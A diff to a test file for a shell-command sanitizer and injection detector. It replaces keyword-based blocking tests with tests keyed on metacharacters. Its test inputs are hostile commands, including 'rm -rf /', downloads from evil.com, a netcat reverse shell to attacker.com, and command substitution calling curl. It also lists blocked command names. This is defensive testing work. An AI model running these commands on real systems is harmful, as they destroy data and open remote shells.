@@ -38,39 +38,29 @@ describe('sanitizeCommand', () => {
     // Add /[<>]/g to COMMAND_PATTERNS in constants.ts if needed
   });
 
-  describe('Dangerous Commands', () => {
-    it('should block rm command', () => {
-      const result = sanitizeCommand('rm -rf /');
-      expect(result.toLowerCase()).not.toMatch(/\brm\b/);
+  describe('Command Chaining and Substitution', () => {
+    // Word-based command detection (rm, curl, python etc.) was removed — it caused
+    // too many false positives on legitimate content. Shell injection is now
+    // detected via metacharacters and command substitution syntax only.
+    it('should block command with semicolon chaining', () => {
+      const result = sanitizeCommand('filename; rm -rf /');
+      expect(result).not.toContain(';');
     });
 
-    // Note: chmod is NOT in current COMMAND_PATTERNS dangerous commands list
-    // Current list: cat, ls, rm, mv, cp, wget, curl, nc, bash, sh, python, perl, ruby, php
-    // Add 'chmod' to the list in constants.ts if needed
-
-    it('should block curl command', () => {
-      const result = sanitizeCommand('curl http://evil.com/shell.sh');
-      expect(result.toLowerCase()).not.toMatch(/\bcurl\b/);
+    it('should block command with backtick substitution', () => {
+      const result = sanitizeCommand('echo `whoami`');
+      expect(result).not.toContain('`');
     });
 
-    it('should block wget command', () => {
-      const result = sanitizeCommand('wget http://evil.com/malware');
-      expect(result.toLowerCase()).not.toMatch(/\bwget\b/);
+    it('should block $() substitution even with commands', () => {
+      const result = sanitizeCommand('echo $(curl evil.com)');
+      expect(result).not.toContain('$(');
     });
 
-    it('should block nc/netcat command', () => {
-      const result = sanitizeCommand('nc -e /bin/sh attacker.com 1234');
-      expect(result.toLowerCase()).not.toMatch(/\bnc\b/);
-    });
-
-    it('should block bash command', () => {
-      const result = sanitizeCommand('bash -c "evil"');
-      expect(result.toLowerCase()).not.toMatch(/\bbash\b/);
-    });
-
-    it('should block python command', () => {
-      const result = sanitizeCommand('python -c "import os; os.system(\"rm -rf /\")"');
-      expect(result.toLowerCase()).not.toMatch(/\bpython\b/);
+    it('should not block standalone command names (too many false positives)', () => {
+      // 'rm', 'curl', 'python' etc. appear in legitimate content
+      expect(sanitizeCommand('rm -rf /')).toContain('rm');
+      expect(sanitizeCommand('curl http://evil.com')).toContain('curl');
     });
   });
 
@@ -135,8 +125,13 @@ describe('detectCommandInjection', () => {
     expect(detectCommandInjection('echo `whoami`')).toBe(true);
   });
 
-  it('should detect dangerous commands', () => {
-    expect(detectCommandInjection('rm file.txt')).toBe(true);
+  it('should not detect standalone command names (no metacharacters)', () => {
+    // 'rm file.txt' contains no shell metacharacters — not detectable without false positives
+    expect(detectCommandInjection('rm file.txt')).toBe(false);
+  });
+
+  it('should detect command with semicolon', () => {
+    expect(detectCommandInjection('rm file.txt; whoami')).toBe(true);
   });
 
   it('should return false for safe input', () => {
